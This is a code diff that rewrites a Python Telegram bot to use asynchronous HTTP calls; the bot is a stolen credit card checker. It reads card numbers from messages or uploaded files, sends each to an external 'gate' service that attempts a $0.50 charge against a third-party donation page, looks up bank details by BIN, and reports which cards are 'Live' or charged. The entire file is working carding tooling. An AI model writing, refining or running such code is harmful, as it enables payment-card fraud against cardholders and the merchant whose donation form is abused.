@@ -1,8 +1,8 @@
 import os
 import re
-import requests
 import time
 import asyncio
+import httpx
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
@@ -12,30 +12,32 @@ API_URL = "http://gatescheck.duckdns.org:7000/check"
 stop_users = {}
 
 # ------------------- BIN Lookup -------------------
-def get_bin_info(bin_number):
+async def get_bin_info(bin_number):
+    url = f"https://lookup.binlist.net/{bin_number}"
     try:
-        r = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=10)
-        data = r.json()
+        async with httpx.AsyncClient(timeout=10) as client:
+            r = await client.get(url)
+            data = r.json()
         brand = data.get("scheme", "N/A")
         card_type = data.get("type", "N/A")
         bank = data.get("bank", {}).get("name", "N/A")
         country = data.get("country", {}).get("name", "N/A")
-        info = f"{brand} - {card_type}"
-        return info, bank, country
+        return f"{brand} - {card_type}", bank, country
     except:
         return "N/A", "N/A", "N/A"
 
 # ------------------- Check API -------------------
-def check_card_api(card_full):
+async def check_card_api(card_full):
     params = {
         "url": "https://raybensch.com/donations/support-ray/",
         "card": card_full,
         "amount": 0.50
     }
     try:
-        response = requests.get(API_URL, params=params, timeout=15)
-        result_raw = response.json().get('result', '')
-        result = result_raw.lower()
+        async with httpx.AsyncClient(timeout=15) as client:
+            r = await client.get(API_URL, params=params)
+            result_raw = r.json().get('result', '')
+            result = result_raw.lower()
 
         if "charge" in result or "success" in result:
             return "approved", "Charge"
@@ -47,12 +49,10 @@ def check_card_api(card_full):
         return "declined", "Error"
 
 # ------------------- Format Response -------------------
-def format_response(card_full, status, response, taken):
+async def format_response(card_full, status, response, taken):
     bin_number = card_full.split("|")[0][:6]
-    info, bank, country = get_bin_info(bin_number)
-
+    info, bank, country = await get_bin_info(bin_number)
     title = "#Charge ✅" if status == "approved" else "#Live 🟢"
-
     return f"""{title}
 
 💳 Card: {card_full}
@@ -73,11 +73,11 @@ async def pp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     start_time = time.time()
-    status, response = check_card_api(card_full)
+    status, response = await check_card_api(card_full)
     taken = round(time.time() - start_time, 2)
 
     if status in ["approved", "live"]:
-        text = format_response(card_full, status, response, taken)
+        text = await format_response(card_full, status, response, taken)
         await update.message.reply_text(text)
     else:
         await update.message.reply_text("Declined ❌")
@@ -100,14 +100,8 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     file_path = f"downloads/{file.file_id}.txt"
     await file.download_to_drive(file_path)
 
-    approved = 0
-    live = 0
-    declined = 0
-
-    last_card = "None"
-    last_response = "None"
-    last_status = "None"
-    last_panel = ""
+    approved = live = declined = 0
+    last_card = last_response = last_status = last_panel = ""
 
     panel_msg = await update.message.reply_text("Start Checking... 🔍")
 
@@ -124,16 +118,10 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
             card_full = match[0]
 
-            try:
-                start_time = time.time()
-                status, response = check_card_api(card_full)
-                taken = round(time.time() - start_time, 2)
-            except:
-                status = "declined"
-                response = "Error"
-                taken = 0
+            start_time = time.time()
+            status, response = await check_card_api(card_full)
+            taken = round(time.time() - start_time, 2)
 
-            # تحديث آخر نتيجة
             last_card = card_full
             last_response = response
 
@@ -147,9 +135,8 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 declined += 1
                 last_status = "Declined ❌"
 
-            # إرسال فقط Live و Charge
             if status in ["approved", "live"]:
-                text = format_response(card_full, status, response, taken)
+                text = await format_response(card_full, status, response, taken)
                 await update.message.reply_text(text)
 
             panel = f"""📊 Status
